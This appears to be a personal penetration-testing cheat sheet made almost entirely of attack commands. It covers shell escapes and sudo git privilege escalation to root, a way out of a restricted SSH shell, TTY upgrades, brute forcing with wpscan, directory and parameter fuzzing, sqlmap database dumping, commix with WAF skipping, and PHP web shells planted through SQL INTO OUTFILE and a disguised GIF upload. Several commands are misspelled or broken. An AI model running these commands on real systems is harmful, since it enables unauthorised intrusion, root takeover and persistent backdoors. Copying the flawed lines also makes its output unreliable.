sudo git -p --help
!/bin/bash //Pagination root Privilege Escalation
=============================================================================================================
===From within vi
:set shell=/bin/sh
:shell

===From within IRB
exec "/bin/sh"

===awk
awk "BEGIN {system("/bin/bash")}"

===find
find / -exec /usr/bin/awk awk "BEGIN {system("/bin/bash")}" \;

===perl
perl -e 'exec "/bin/bash";'

1. First for this method, find which bin file 'awk' is in
find / -name udev -exec /usr/bin/awk 'BEGIN {system("/bin/bash -i")}' \;
=============================================================================================================
================Jailed SSH Shell? Try this...================================================================
Initial shell /bin/sh
If BASH is blocked.
Check if 'env' variable!
Linux will default to /bin/bash default bashrc if there is no present .bashrc
file in a User's home directory. Legit shell.......)

1. ssh sara@127.0.0.1 "/bin/sh"
2. cd $HOME
3. mv .bashrc .bashrc.BAK (Yes this actually work)
4. exit
5. ssh sara@127.0.0.1

$BLING BLING$
sara@SkyTower
=============================================================================================================
[+ AND EXPORT PATH ]
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='clear; ls -lsaht --color=auto'
Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200
=============================================================================================================
======Once Broken out - Before PrivEsc Reference - Perform These COmmands====================================
find / -perm -2 | -type 1 -ls 2>/dev/null | sort -r
-------------------------------------------------------------------------------------------------------------
grep -vE "nologin|false" /etc/passwd
-------------------------------------------------------------------------------------------------------------
===Other, misc
nmap --interactive
nmap> !sh
=============================================================================================================
===Vocabulary generation
cewl $URL -m 5 $PWD/cewl.txt 2>/dev/null
=============================================================================================================
===WPSCAN & SSL
wpscan --url $URL --disable-tls-check --enumerate p --enumerate t --enumerate u

===WPSCAN Brute forcing:
wpscan --url $URL --disable-tls-check -U users.txt -P /usr/share/wordlists/rockyou.txt
=============================================================================================================
===Nikto with SSL and Evasion
nikto --host $IP --ssl -evasion 1
=============================================================================================================
===WHATWEB
whatweb -a 3 $URL
=============================================================================================================
===DNS Recon
dnsrecon -d youdomain.com
=============================================================================================================
===gobuster directory
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30 --no-error

===gobuster files
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -k -t 30 --no-error
txt
===gobuster for SubDomain bruteforcing
gobuster dns -d $DOMAIN -w /opt/SecLists/Discovery/DNS/subdomains-top1million-11000 -t 30 --no-error
"Just make sure that any DNS name you found to an in-scope address before you test it"
=============================================================================================================
===Extract IPs from a text files
grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' nmapfile.txt
=============================================================================================================
===WFUZZ XSS Fuzzing
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/command-injection.txt -d "doi=FUZZ" "$URL"

===wfuzz html_escape
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/yeah.txt "$URL"

===Test for parameter existence
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt "$URL"

===Authenticated Fuzzing Directories
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d "PARAM=value" "$URL"

===Authenticated File Fuzzing
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-words.txt --hc 404 -d "PARAM=value" "$URL"

===FUZZ Directories
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"

===FUZZ Files
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
|
Large words
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-filwords --hc 404 "$URL"
|
USERS
wfuzz -c -z file,/opt/SecLists/Fuzzing/USERNAMES/usernames.txt --hcc 404,403 "$URL"

=============================================================================================================
===Command injection with commix, ssl, waf, random agent
commix --url-"https://supermegaleetultradomain.com?parameter=" --level=3 --force-ssl --skip-waf --radonm-agent
=============================================================================================================
===SQLMap
sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
sqlmap -u $URL --threads=2 --time-sec=10 --level=4 --risk=3 --dump
/SecLists/Fuzzing/alphanum-case.txt
=============================================================================================================
===Social Recon
tharvester -d domain.org -l 500 -b google
=============================================================================================================
==nmap http-methods
nmap -p80,443 --script=http-methods --script-args http-methods.url-path='/directory/goes/here' $IP
=============================================================================================================
===Ping check
tcpdump -i eth0 -c5 icmp
===
#Check network
netdiscover /r 0.0.0.0/24
===
#INTO OUTFILE DOOR
SELECT "<?php system($_GET['cmd']);?>" into outfile "/var/www/WEROOT/backdoor.php";
===
LFI
#PHP filter checks
php://filter/convert.base64-encode/resource=
===
UPLOAD Image
GIF89a1
<?php system($_POST["cmd"]); ?>
